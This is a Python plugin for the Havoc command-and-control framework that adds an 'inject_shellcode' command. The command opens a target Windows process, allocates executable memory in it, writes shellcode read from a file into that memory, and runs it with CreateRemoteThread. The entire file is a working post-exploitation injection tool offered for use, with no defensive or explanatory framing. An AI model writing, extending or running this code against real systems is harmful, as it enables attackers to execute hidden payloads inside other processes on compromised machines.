from havoc import Demon, RegisterCommand, Plugin
import ctypes
import os
import platform
from ctypes import wintypes

# Constants for Windows API
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

# Load kernel32.dll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define types and structures
SIZE_T = ctypes.c_size_t
LPSTR = ctypes.c_char_p
LPVOID = ctypes.c_void_p

# Define Windows API functions
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [wintypes.HANDLE, LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD]
VirtualAllocEx.restype = LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, LPVOID, LPVOID, SIZE_T, ctypes.POINTER(SIZE_T)]
WriteProcessMemory.restype = wintypes.BOOL

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = [wintypes.HANDLE, ctypes.POINTER(ctypes.c_void_p), SIZE_T, LPVOID, LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
CreateRemoteThread.restype = wintypes.HANDLE

def inject_shellcode(pid, shellcode):
    """
    Injects shellcode into a remote process.
    """
    try:
        if platform.system() != 'Windows':
            return "[-] Shellcode injection is only supported on Windows."

        # Open the target process
        process_handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not process_handle:
            return f"[-] Error opening process: {ctypes.get_last_error()}"

        # Allocate memory in the remote process
        shellcode_size = len(shellcode)
        remote_memory = VirtualAllocEx(process_handle, None, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
        if not remote_memory:
            return f"[-] Error allocating memory: {ctypes.get_last_error()}"

        # Write the shellcode into the remote process's memory
        written = ctypes.c_size_t(0)
        if not WriteProcessMemory(process_handle, remote_memory, shellcode, shellcode_size, ctypes.byref(written)):
            return f"[-] Error writing to memory: {ctypes.get_last_error()}"

        # Create a remote thread to execute the shellcode
        thread_id = ctypes.c_ulong(0)
        thread_handle = CreateRemoteThread(process_handle, None, 0, remote_memory, None, 0, ctypes.byref(thread_id))
        if not thread_handle:
            return f"[-] Error creating remote thread: {ctypes.get_last_error()}"

        return f"[+] Shellcode injected successfully into process {pid}!"
    except Exception as e:
        return f"[-] Error during injection: {e}"

# Havoc C2 Integration
def inject_shellcode_command(demon, *args):
    """
    Command to inject shellcode into a remote process.
    """
    if len(args) != 2:
        demon.ConsoleWrite("[-] Usage: inject_shellcode [pid] [shellcode_file]")
        return

    pid = int(args[0])
    shellcode_file = args[1]

    try:
        with open(shellcode_file, 'rb') as f:
            shellcode = f.read()
    except Exception as e:
        demon.ConsoleWrite(f"[-] Error reading shellcode file: {e}")
        return

    result = inject_shellcode(pid, shellcode)
    demon.ConsoleWrite(result)

# Register commands with Havoc C2
def initialize():
    RegisterCommand("inject_shellcode", "Inject shellcode into a remote process", inject_shellcode_command)

# Initialize the plugin
plugin = Plugin("ProcessInjection", "Advanced process injection techniques", initialize)